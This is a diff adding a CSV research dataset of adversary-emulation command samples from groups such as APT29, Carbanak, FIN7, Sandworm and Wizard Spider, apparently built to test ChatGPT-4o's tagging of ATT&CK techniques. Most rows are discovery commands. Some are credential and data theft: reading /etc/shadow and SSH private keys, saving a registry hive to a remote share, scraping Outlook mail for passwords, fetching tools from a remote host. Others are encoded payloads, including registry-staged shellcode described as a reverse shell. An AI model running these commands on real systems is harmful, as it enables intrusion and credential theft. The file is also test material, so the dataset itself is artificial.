@@ -1,0 +1,224 @@
+Group,Code-sample-name,technique,tactic,Code-sample,Description specific to Code-sample (from emulation-plans),Additional Notes on Group classification,"Technique is in ""Technique-knowledge-file--80.json""?",ChatGPT-4.o Response (WITHOUT knowledge-file),ChatGPT-4.o Response (WITH knowledge-file),Tagging result (WITHOUT knowledge-file),Tagging result (WITH knowledge-file),Analysis (comparison with & w/o knowledge-file)
+Group 1:        Self sufficient,apt29/collection--T1115  Clipboard Data--windows,T1115: Clipboard Data,collection,"$clip_data=get-clipboard;
+if ($clip_data.Length -gt 0) {
+  write-host ""[+] Clipboard data obtained!\n"";
+  write-host $clip_data;
+} else {
+  write-host ""[!] No clipboard data available!\n"";
+}","- id: ee4c2eab-be57-434c-a32c-14b77360301a
+  name: Automated Collection (T1119) - Clipboard (T1115)
+  description: Get contents of clipboard",,,,,,,
+Group 1:        Self sufficient,apt29/collection--T1119: Automated Collection--windows,T1119: Automated Collection,collection,"$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\Draft.Zip -Force","- id: 5692da31-3586-4e4f-8f07-5750070c730b
+  name: Automated Collection
+  description: Execute PowerShell from cmd.exe to collect and compress files of specific extensions.",,,,,,,
+Group 1:        Self sufficient,apt29/defensive-evasion--T1112  Modify Registry--windows,T1112: Modify Registry,defense-evasion,"Remove-Item -Path HKCU:\Software\Classes\Folder* -Recurse -Force;
+if (!(test-path -path HKCU:\Software\Classes\Folder)) {
+  write-host ""[+] Reg keys removed!"";
+ }","- id: 5ff80022-8d85-410b-b868-6c7565b267e5
+  name: Registry Cleanup for UAC Bypass Technique
+  description: Delete registry entries post-UAC bypass.",이것도 Exeternally-dependent에 가야하나? ,,,,,,
+Group 1:        Self sufficient,apt29/discovery--T1007  System Service Discovery--windows,T1007: System Service Discovery,discovery,net start,"- id: 144b1384-5060-494f-80eb-91772695cdf3
+  name: System Service Discovery
+  description: The net utility is executed via cmd to enumerate local active services.",,,,,,,
+Group 1:        Self sufficient,apt29/discovery--T1012  Query Registry--windows,T1012: Query Registry,discovery,reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System,"- id: 5c23f638-9cfc-4fc4-9cab-4af628fef70a
+  name: Query Registry
+  description: The reg utility is executed via cmd to enumerate a specific Registry key associated with local system policies to ensure that the user will not be prompted for credentials when elevating permissions.",,,,,,,
+Group 1:        Self sufficient,apt29/discovery--T1016: System Network Configuration Discovery--windows,T1016: System Network Configuration Discovery,discovery,netsh advfirewall show allprofiles,"- id: 5f4263c4-7ff1-4098-b5f5-f41faa31cf5b
+  name: System Network Configuration Discovery
+  description: The netsh utility is executed via cmd to enumerate local firewall configuration information.",,,,,,,
+Group 1:        Self sufficient,apt29/discovery--T1049  System Network Connections Discovery--windows,T1049: System Network Connections Discovery,discovery,netstat -ano,"- id: ba0b398d-91b8-490a-bed2-f959afa8e1aa
+  name: 4.C.2 - System Network Connections Discovery (T1049)
+  description: The netstat utility is executed via cmd to enumerate local active network connections.",,,,,,,
+Group 1:        Self sufficient,apt29/discovery--T1069  Permission Groups Discovery--windows,T1069: Permission Groups Discovery,discovery,"cmd.exe /c net group ""Domain Admins"" /domain","- id: 84377d7a-0363-44fd-a082-44657ca1858f
+  name: Permissions Groups Discovery
+  description: The net utility is executed via cmd to enumerate members of the domain administrators group.",,,,,,,
+Group 1:        Self sufficient,apt29/discovery--T1083  File and Directory Discovery--windows,T1083: File and Directory Discovery,discovery,ls 192.0.2.20,"- id: d5170a60-3bdc-44e0-9870-a38db5c0cf81
+  name: File and Directory Discovery (T1083)
+  description: PowerShell's Get-ChildItem alias 'ls' is used to enumerate files in a remote file share.",,,,,,,
+Group 1:        Self sufficient,apt29/discovery--T1087  Account Discovery--windows,T1087: Account Discovery,discovery,net user %USERNAME% /domain,"- id: 9ce5bf9f-44ec-44c4-bbe0-6d68a83e1b76
+  name: Account Discovery
+  description: The net utility is executed via cmd to enumerate detailed information about a specific user account.",,,,,,,
+Group 1:        Self sufficient,"apt29/impact--T1529  System Shutdown,Reboot--windows","T1529: System Shutdown,Reboot",impact,"write-host ""[*] Restarting Computer"";
+Restart-Computer -Force;","- id: 4b2e9574-b1a7-4b38-95b2-6054ded9c4fe
+  name: Scheduled Task
+  description: Reboot the machine to aid in peristence callbacks",이것도 Exeternally-dependent에 가야하나? ,,,,,,
+Group 1:        Self sufficient,apt29/lateral-movement--T1037.005  Boot or Logon Initialization Scripts  Startup Items--windows,T1037.005: Boot or Logon Initialization Scripts  Startup Items,lateral-movement,"cmdkey /add:127.0.0.2 /user:Administrator /pass:Password123!;
+mstsc /v:127.0.0.2;
+sleep 10;
+Get-Process -name mstsc;
+if ($?) { taskkill.exe /F /IM mstsc.exe; exit 0; } else {exit 1;}","- id: 00446217-53ca-4749-bacd-f41fe189d36e
+  name: Startup Folder Persistence Execution
+  description: Sets credentials for a headless RDP session to spawn triggering startup folder persistence.
+",,,,,,,
+Group 1:        Self sufficient,carbanak/defense-evasion--T1112  Modify Registry--windows,T1112: Modify Registry,defense-evasion,"cmd.exe /c 'REG ADD ""HKCU\Software\InternetExplorer\AppDataLow\Software\Microsoft\InternetExplorer"" /f /v ""{018247B2CAC14652E}"" /t REG_SZ /d H4sIAJEshl4C/2sx/Dmnc9KWyqoKC21LTQ1NfSPP1fIGnzQkDD9qJRp91o4y+MShYVh63tjA1GOzgceuK67SLNVhERa7N5ZYV+6YMVXbWhOoMvKjlatR5UqZn4xJxdWlf7mrKio//vgIJI3+7uSTN6xeofnRINHus2WUYcWq2fpG7RusP/t+MqhYAzUTaprTDJ5ukyqzmEJ7xxX8CxSB6uOA6uUsPpYYAtlpQLblp7oPQNMslCwVVRSVrRUslC2VjX5PjbLUbp2haK2obPQ5e7JxW2u7ivExPk4vNU+vyipLfeOP841+Tr1VWVll+GG+4dGKirRXOy5W1VjoGX6YZ/Kh2/KwGX98bfsas4+ThSorqioUrA8F/BKubF0rXGCprqVh4r3RxHuHYesOw8+7wOROiwOTypbOaFtv8GGvUKa1gunnWYafGy0OPLzDJ9m2HujfIoPWbTzzJ7wCef/31CyDDzOA3hSqtVYAK6tasEm9bf3vxio2HaPfe6PUPvQIWVorClZlAJ2qaPSx28hzg/UhxXvac1rXGn7ebfB5P9ABBp87DD8vQtXOGqhkqacsUGlVUWmtIFylZHGgOKzUo229PtD9PCKmEq1rgc6Y4Nbe1mpQsdMgYI/Bnx7es9bt85SEKpUN9+3oOHNDr209AOpTVHH+AQAA'","- id: e238f1b5-a4e7-464d-82eb-36d0cc875434
+  name: Stage 2nd Stage RAT
+  description: The shellcode for the 2nd stage RAT, which is a reverse Meterpreter shell, is written to the Registry",appears as obfuscated,,,,,,
+Group 1:        Self sufficient,carbanak/discovery--T1018  Remote System Discovery,T1018: Remote System Discovery,discovery,nslookup bankdc,"- id: 76c8f978-cc38-4281-8236-ecb7fae8f99c
+  name: Remote System Discovery on bankfileserver
+  description: The nslookup utility is used to find the IP address of bankdc",,,,,,,
+Group 1:        Self sufficient,carbanak/discovery--T1018  Remote System Discovery--windows,T1018: Remote System Discovery,discovery,Get-ADComputer -Identity 'cfo' -Properties *,"- id: c66c3b49-719f-4643-a307-4a889177b61d
+  name: Get CFO Workstation Information from bankdc
+  description: Get CFO Workstation Information from bankdc by running Get-ADComputer",,,,,,,
+Group 1:        Self sufficient,"carbanak/discovery--T1033  System Owner,User Discovery--windows","T1033: System Owner,User Discovery",discovery,"qwinsta /server:cfo","- id: 71c20631-adf4-4073-9f2f-6ab7f053326f
+  name: Check for Active CFO Login on CFO from BankDC
+  description: Use qwinsta to check if the CFO user is logged into their workstation",,,,,,,
+Group 1:        Self sufficient,carbanak/discovery--T1057  Process Discovery--linux,T1057: Process Discovery,discovery,ps ax,"- id: 9c5d756e-c72a-40d0-838d-3ace6cc96a09
+  name: Process Discovery on bankfileserver
+  description: Processes are listed on bankfileserver",,,,,,,
+Group 1:        Self sufficient,carbanak/discovery--T1083  File and Directory Discovery--linux,T1083: File and Directory Discovery,discovery,ls -lsahR /var/ 2>/dev/null,"- id: da810df4-c1c2-48f1-a29a-765098acec17
+  name: File and Directory Discovery on bankfileserver
+  description: List directories and files within the /var/ directory on bankfileserver",,,,,,,
+Group 1:        Self sufficient,"fin6/persistence--T1053.005  Scheduled Task,Job  Scheduled Task--windows","T1053.005: Scheduled Task,Job  Scheduled Task",persistence,"C:\Windows\System32\schtasks.exe /create /tn ""<<JY:NO DEFAULT-VALUE--DESC:'Task Name'>>"" /tr ""<<JY:NO DEFAULT-VALUE--DESC:'Path of task to run'>>"" /sc <<JY:NO DEFAULT-VALUE--DESC:'Schedule for task (MINUTE, HOURLY, DAILY, WEEKLY, MONTHLY, ONCE, ONSTART, ONLOGON, ONIDLE, and ONEVENT)'>> /ru System","- id: 0864a91a-ae17-1cce-8b89-d4f8f2854699
+  name: Scheduled Task Persistence
+  description: FIN6 utilizes cmd to execute Scheduled Tasks",,,,,,,
+Group 1:        Self sufficient,"fin6/persistence--T1547.001  Boot or Logon Autostart Execution  Registry Run Keys , Startup Folder--windows","T1547.001  Boot or Logon Autostart Execution  Registry Run Keys , Startup Folder",persistence,"""C:\Windows\System32\reg.exe"" ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v ""<<JY:NO DEFAULT-VALUE--DESC:'Name of the registry entry to be added'>>"" /t REG_SZ /d ""<<JY:NO DEFAULT-VALUE--DESC:'Data for new registry entry'>>"" /f
+","- id: 44d82f6f-f367-4db7-aa65-a9e5717b1a21
+  name: Registry Run Keys
+  description: FIN6 utilizes cmd to execute Registry Run Keys",,,,,,,
+Group 1:        Self sufficient,fin7/Defense Evasion--T1027  Obfuscated Files or Information--windows,T1027: Obfuscated Files or Information,Defense Evasion,"powershell.exe -noprofile -encodedCommand ""JABkAGwAbAAgAD0AIABHAGUAdAAtAEMAbwBuAHQAZQBuAHQAIAAiAFwAXAB0AHMAYwBsAGkAZQBuAHQAXABYAFwAYgBpAG4AMwAyADkALgB0AG0AcAAiACAALQBFAG4AYwBvAGQAaQBuAGcAIABCAHkAdABlADsAIABOAGUAdwAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAIgBIAEsATABNADoAXABTAG8AZgB0AHcAYQByAGUAXABNAGkAYwByAG8AcwBvAGYAdABcAEQAUgBNAFwAIgAgAC0ATgBhAG0AZQAgACIANAAiACAAIAAtAFAAcgBvAHAAZQByAHQAeQBUAHkAcABlACAAQgBpAG4AYQByAHkAIAAtAFYAYQBsAHUAZQAgACQAZABsAGwAIAAtAEYAbwByAGMAZQA7ACAAIABDAG8AcAB5AC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACIAXABcAHQAcwBjAGwAaQBlAG4AdABcAFgAXABkAGwAbAAzADIAOQAuAGQAbABsACIAIAAtAEQAZQBzAHQAaQBuAGEAdABpAG8AbgAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAIgAgAC0ARgBvAHIAYwBlADsAIABDAG8AcAB5AC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACIAXABcAHQAcwBjAGwAaQBlAG4AdABcAFgAXABzAGQAYgBFADMANwA2AC4AdABtAHAAIgAgAC0ARABlAHMAdABpAG4AYQB0AGkAbwBuACAAIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcAAiACAALQBGAG8AcgBjAGUAOwAgACAAJgAgAHMAZABiAGkAbgBzAHQALgBlAHgAZQAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABzAGQAYgBFADMANwA2AC4AdABtAHAAIgA7AA==""","- id: eb99abcb-93e2-4a3e-bf05-a484839dc851
+  name: Setup Application Shim Persistence
+  description: Execute PowerShell oneliner to install application shim.","The encoded command seems appears to be the obfuscation of ""installing application shim""",,,,,,
+Group 1:        Self sufficient,"fin7/Discovery,Execution--T1057  Process Discovery--windows",T1057: Process Discovery,"Discovery,Execution","powershell.exe -c ""ps""","- id: ab937ef4-7c66-4349-ad3b-658c41fcf4c5
+  name: Enumerate
+  description: Perform process discovery (T1057)",,,,,,,
+Group 1:        Self sufficient,menu_pass/collection--T1074.001  Local Data Staging--windows,T1074.001: Local Data Staging--windows,collection,"copy aa.rar ""C:\$Recycle.Bin\""","id: b4fa6d2e-ed9c-4a86-81aa-19331983fe0d
+  name: Recycle Bin Staging
+  description: menuPass actors are thought to have staged archives in the Recycle Bin for exfiltration.",,,,,,,
+Group 1:        Self sufficient,menu_pass/discovery--T1018  Remote System Discovery--windows,T1018: Remote System Discovery,discovery,"Test-NetConnection ""192.0.2.10""","- id: d19678ac-3bca-475e-89d4-f452bfc2cc2a
+  name: Remote System Discovery
+  description: Identify remote system using Powershell",,,,,,,
+Group 1:        Self sufficient,menu_pass/discovery--T1105  Ingress Tool Transfer--windows,T1105: Ingress Tool Transfer--windows,discovery,"Start-BitsTransfer -Source ""http://remote-host/TWUEGJDITXAONVPUOWFV"" -Destination ""C:\ProgramData\temp\TWUEGJDITXAONVPUOWFV""","- id: a750b196-8168-461a-8747-bdc4add107ac
+  name: Ingress Tool Transfer
+  description: Pushing tools to compromised host",,,,,,,
+Group 1:        Self sufficient,menu_pass/discovery--T1135  Network Share Discovery--windows,T1135: Network Share Discovery,discovery,net use,"- id: 7877ec4d-3c11-40f2-9650-35261e4ac879
+  name: Network Share Discovery
+  description: Display network shares",,,,,,,
+Group 1:        Self sufficient,"menu_pass/persistence--T1553.005  Scheduled Task,Job  Scheduled Task--windows","T1553.005: Scheduled Task,Job  Scheduled Task",persistence,"schtasks /create /sc ""DAILY"" /tn ""taskname"" /tr ""C:\Windows\Temp"" /ru ""username""","- id: 236d1357-64f9-4a98-afc1-bccaa89aba8c
+  name: Scheduled Task Persistence
+  description: menuPass is reported to have used scheduled tasks to persist",,,,,,,
+Group 1:        Self sufficient,oilrig/Discovery--T1007  System Service Discovery--windows,T1007: System Service Discovery,Discovery,sc query,"- id: e6eb7d18-606e-4889-8924-f75cafa92811
+  name: OilRig System Service Discovery
+  description: Gather information about registered local system services",,,,,,,
+Group 1:        Self sufficient,oilrig/Discovery--T1012  Query Registry--windows,T1012: Query Registry,Discovery,"reg query ""HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default""","- id: 09502b3c-7541-4c11-92a9-f55e683a6355
+  name: OilRig Query Registry
+  description: Query the Windows registry key HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default",,,,,,,
+Group 1:        Self sufficient,oilrig/Discovery--T1016  System Network Configuration Discovery--windows,T1016: System Network Configuration Discovery,Discovery,ipconfig /all,"- id: 628e8ad3-14af-4670-b797-bcf175a42842
+  name: OilRig Network Interface Configuration
+  description: View network configuration information for host",,,,,,,
+Group 1:        Self sufficient,oilrig/Discovery--T1018  Remote System Discovery,T1018: Remote System Discovery,Discovery,"nslookup WATERFALLS","- id: f9f1bd68-ec0a-47e7-8645-210844190d92
+  name: OilRig nslookup WATERFALLS
+  description: Perform DNS lookup for WATERFALLS",,,,,,,
+Group 1:        Self sufficient,oilrig/Discovery--T1021  Password Policy Discovery--windows,T1021: Password Policy Discovery,Discovery,net accounts /domain,"- id: 41ce9dd8-dc9f-4fba-8ce9-9ef5aaee3d19
+  name: OilRig List domain account settings
+  description: View domain account settings and password policy",,,,,,,
+Group 1:        Self sufficient,"oilrig/discovery--T1033  System Owner,User Discovery--windows","T1033: System Owner,User Discovery",discovery,whoami,"- id: 0386ef16-757e-425c-8355-88e5be40eb32
+  name: OilRig Current User
+  description: Obtain user from current session",,,,,,,
+Group 1:        Self sufficient,oilrig/Discovery--T1049  System Network Connections Discovery--windows,T1049: System Network Connections Discovery,Discovery,netstat -na,"- id: cb8e9faa-ac00-48d8-a359-88044a2c0252
+  name: OilRig View Network Connections
+  description: Find system network connections",,,,,,,
+Group 1:        Self sufficient,oilrig/Discovery--T1057  Process Discovery--windows,T1057: Process Discovery,Discovery,tasklist,"- id: de39f574-f6cc-4026-973e-c5370b36220b
+  name: OilRig Process discovery
+  description: View running processes on system",,,,,,,
+Group 1:        Self sufficient,oilrig/Discovery--T1069.001  Permission Groups Discovery  Local Groups--windows,T1069.001: Permission Groups Discovery  Local Groups,Discovery,net localgroup administrators,"- id: ae4e4c08-82cb-4a17-a873-660f851a1a38
+  name: OilRig ""administrators"" local group discovery
+  description: View the details and members of the ""administrators"" local group",,,,,,,
+Group 1:        Self sufficient,oilrig/Discovery--T1069.002  Permission Groups Discovery  Domain Groups--windows,T1069.002: Permission Groups Discovery  Domain Groups,Discovery,"net group ""SQL Admins"" /domain","- id: 6a7b4ba0-a9bb-451d-ba9f-d3a2e8a82ffe
+  name: OilRig ""SQL Admins"" Group Discovery
+  description: The net utility is executed via cmd to enumerate the ""SQL Admins"" group",,,,,,,
+Group 1:        Self sufficient,"sandworm/credential-access--T1003.008  OS Credential Dumping  ,etc,passwd and ,etc,shadow--linux","T1003.008: OS Credential Dumping  ,etc,passwd and ,etc,shadow",credential-access,cat /etc/shadow,"- id: 8e965415-40be-40f8-8786-da4f67748fef
+  name: Sandworm Read /etc/shadow
+  description: |
+    Sandworm reads /etc/shadow. Note: not in CTI but in TTP scope.",,,,,,,
+Group 1:        Self sufficient,sandworm/credential-access--T1552.003  Unsecured Credentials  Bash History--linux,T1552.003: Unsecured Credentials  Bash History,credential-access,cat /home/fherbert/.bash_history,"- id: 40934e60-6b0d-4d3b-a8f5-ad111c6a0abc
+  name: Sandworm Get Bash History
+  description: |
+    Sandworm reads bash history. Note: not in CTI but in TTP scope.",,,,,,,
+Group 1:        Self sufficient,sandworm/credential-access--T1552.004  Unsecured Credentials  Private Keys--linux,T1552.004: Unsecured Credentials  Private Keys,credential-access,"cat /home/fherbert/.ssh/id_rsa;
+cat /home/fherbert/.ssh/id_rsa.pub;","- id: dc3152ac-1014-4f96-98c9-a64d5a61712e
+  name: Sandworm Get SSH Keys
+  description: |
+    Sandworm reads SSH keys. Note: not in CTI but in TTP scope.",,,,,,,
+Group 1:        Self sufficient,sandworm/discovery--T1018  Remote System Discovery--windows,T1018: Remote System Discovery,discovery,"dsquery.exe computer -s 10.0.1.4 -u patreides -p ebqMB7DmM81QVUqpf7XI","- id: 6222bcab-b7ec-4523-a236-273d48270649
+  name: Sandworm Remote System Discovery (dsquery)
+  description: |
+    Sandworm Enumerate all domain hosts via dsquery.exe in preparation for Notpetya deployment.","""Notpetya"" mentioned here is related to the previously discussed ""perfc.dat"" file",,,,,,
+Group 1:        Self sufficient,"sandworm/discovery--T1033  System Owner,User Discovery--windows","T1033: System Owner,User Discovery",discovery,whoami.exe,"- id: e870a202-354f-4214-82e6-c5f88cb33b65
+  name: Sandworm Windows Discovery - Current User
+  description: |
+    Sandworm Team has collected the username from a compromised host.",,,,,,,
+Group 1:        Self sufficient,sandworm/discovery--T1049  System Network Connections Discovery--windows,T1049: System Network Connections Discovery,discovery,netstat -ano | findstr 3389,"- id: 73decaa1-5ba3-4739-812d-633929a158fd
+  name: Sandworm Windows Discovery - List RDP Connections
+  description: |
+    Sandworm Team had gathered user, IP address, and server data related to RDP sessions on a compromised host.",,,,,,,
+Group 1:        Self sufficient,sandworm/discovery--T1082  System Information Discovery--windows,T1082: System Information Discovery,discovery,"reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"" /v ProductName &
+reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"" /v CurrentMajorVersionNumber &
+reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"" /v CurrentMinorVersionNumber &
+reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"" /v CurrentBuild
+","- id: 90cbd004-d5e9-4b05-9abe-12b93f77ede3
+  name: Sandworm Windows Discovery - Windows Version Info
+  description: |
+    Sandworm Team enumerates information about the infected system's operating system.","The code-sample could also be seen as ""Query Registry"" technique  이것도 Exeternally-dependent에 가야하나? ",,,,,,
+Group 1:        Self sufficient,sandworm/discovery--T1083  File and Directory Discovery--windows,T1083: File and Directory Discovery,discovery,dir /s /b C:\ > dir.out,"- id: fa3ea4c1-c980-41b1-be78-c8c932d68e98
+  name: Sandworm Windows Discovery - List Entire File System
+  description: |
+    Sandworm Team has enumerated files on a compromised host.",,,,,,,
+Group 1:        Self sufficient,wizard_spider/collection--T1114.001  Email Collection  Local Email Collection--windows,T1114.001: Email Collection  Local Email Collection,collection,"Add-type -assembly ""Microsoft.Office.Interop.Outlook"" | out-null;
+$olFolders = ""Microsoft.Office.Interop.Outlook.olDefaultFolders"" -as [type];
+$outlook = New-Object -comobject outlook.application;
+$namespace = $outlook.GetNameSpace(""MAPI"");
+$folder = $namespace.getDefaultFolder($olFolders::olFolderInBox);
+($folder.items | Select-Object -Unique -ExpandProperty SenderEmailAddress) -join "";"";","- id: 5a5c65c7-d0ff-4275-8f8e-ea0b617369bd
+  name: Emotet Scrape Email Addresses from Outlook
+  description: |
+    Wizard Spider leverages a module that can scrape email addresses from Outlook.",Emotet is known for its capabilities to run commands on compromised hosts as part of its malware functionality. ,,,,,,
+Group 1:        Self sufficient,wizard_spider/credential-access--T1003.002  OS Credential Dumping  Security Account Manager--windows,T1003.002: OS Credential Dumping  Security Account Manager,credential-access,"cmd /c ""reg SAVE HKLM\SYSTEM \\TSCLIENT\X\SYSTEM_HIVE""","- id: bb98782b-2519-4721-a723-b8f027b441d4
+  name: Wizard Spider Save Registry Hive
+  description: |
+    Uses cmd.exe to execute reg.exe to save HKLM\SYSTEM",,,,,,,
+Group 1:        Self sufficient,wizard_spider/credential-access--T1552  Unsecured Credentials--windows,T1552: Unsecured Credentials,credential-access,"Add-type -assembly ""Microsoft.Office.Interop.Outlook"" | out-null;
+$olFolders = ""Microsoft.Office.Interop.Outlook.olDefaultFolders"" -as [type];
+$outlook = new-object -comobject outlook.application;
+$namespace = $outlook.GetNameSpace(""MAPI"");
+$folder = $namespace.getDefaultFolder($olFolders::olFolderInBox);
+($folder.items | Select-Object -ExpandProperty Body | Select-String ""password"") -replace ""\s+"", "" "" -join "";"";","- id: 16abc48a-1f69-4246-83e3-4d0cec0e8d81
+  name: Emotet Scrape Email Content From Outlook
+  description: |
+    Wizard Spider leverages a module that scrapes email data from Outlook.",,,,,,,
+Group 1:        Self sufficient,wizard_spider/discovery--T1007  System Service Discovery--windows,T1007: System Service Discovery,discovery,sc query >> discovery.txt,"- id: dc4236df-0484-4763-891a-c2f6ede5293d
+  name: TrickBot System Service Discovery (systeminfo)
+  description: |
+    Wizard Spider uses TrickBot to collect a list of installed programs and services on the system’s machine","
+Trickbot is not simply a standalone executable; rather, it is a modular malware platform that can act as both an executable payload and a bot capable of executing commands received from a command-and-control (C2) server.",,,,,,
+Group 1:        Self sufficient,wizard_spider/discovery--T1016  System Network Configuration Discovery--windows,T1016: System Network Configuration Discovery,discovery,ipconfig /all,"- id: f6de05d2-5ec5-4d27-b19c-f8cf817d6213
+  name: TrickBot System Network Configuration Discovery
+  description: |
+    Wizard Spider uses TrickBot to obtain the IP address, location, and other relevant network information from the victim’s machine.",,,,,,,
+Group 1:        Self sufficient,wizard_spider/discovery--T1049  System Network Connections Discovery--windows,T1049: System Network Connections Discovery,discovery,netstat -tan,"- id: aa1b8eef-2c76-4184-b7a7-2b5c175e49f6
+  name: TrickBot System Network Connections Discovery
+  description: |
+    Wizard Spider uses TrickBot to obtain the network connection information from the victim’s machine.",,,,,,,
+Group 1:        Self sufficient,wizard_spider/discovery--T1057  Process Discovery--windows,T1057: Process Discovery,discovery,tasklist.exe,"- id: 69ce4dd6-ab00-4c63-bcfd-ab02da96c63a
+  name: Emotet Process Discovery
+  description: |
+    Emotet has been observed enumerating local processes.",,,,,,,
+Group 1:        Self sufficient,wizard_spider/discovery--T1069  Permission Groups Discovery--windows,T1069: Permission Groups Discovery,discovery,whoami /groups >> discovery.txt,"- id: ced2de73-54fa-49ec-b60d-de635dcde620
+  name: TrickBot Permission Groups Discovery
+  description: |
+    Wizard Spider uses TrickBot to identify the groups the user on a compromised host belongs to.",,,,,,,
+Group 1:        Self sufficient,wizard_spider/discovery--T1082  System Information Discovery--windows,T1082: System Information Discovery,discovery,net config workstation >> discovery.txt,"- id: 1f30fdc6-88c0-4c69-958d-6101468bd0ec
+  name: TrickBot System Information Discovery (net config)
+  description: |
+    Wizard Spider uses TrickBot to gather client specfic information",,,,,,,
+Group 1:        Self sufficient,wizard_spider/discovery--T1087.001  Account Discovery  Local Account--windows,T1087.001: Account Discovery  Local Account,discovery,net user >> discovery.txt,"- id: 53e87d17-b904-4739-92f0-4b5169d9a1d4
+  name: TrickBot Local Account Discovery
+  description: |
+    Wizard Spider uses TrickBot to collect the local users of the system.",,,,,,,
+Group 1:        Self sufficient,wizard_spider/discovery--T1087.002  Account Discovery  Domain Account--windows,T1087.002: Account Discovery  Domain Account,discovery,net user /domain >> discovery.txt,"- id: e639caf1-8987-4aad-b6f1-6a1d186e2ec9
+  name: TrickBot Domain Account Discovery
+  description: |
+    Wizard Spider uses TrickBot to collect the domain users of the system.",,,,,,,
+Group 1:        Self sufficient,wizard_spider/discovery--T1482  Domain Trust Discovery--windows,T1482: Domain Trust Discovery,discovery,nltest /domain_trusts /all_trusts >> discovery.txt,"- id: ed40220d-9d1f-4191-b73f-54f17278e256
+  name: TrickBot Domain Trust Discovery
+  description: |
+    Wizard Spider uses TrickBot to gather domain specfic information",,,,,,,
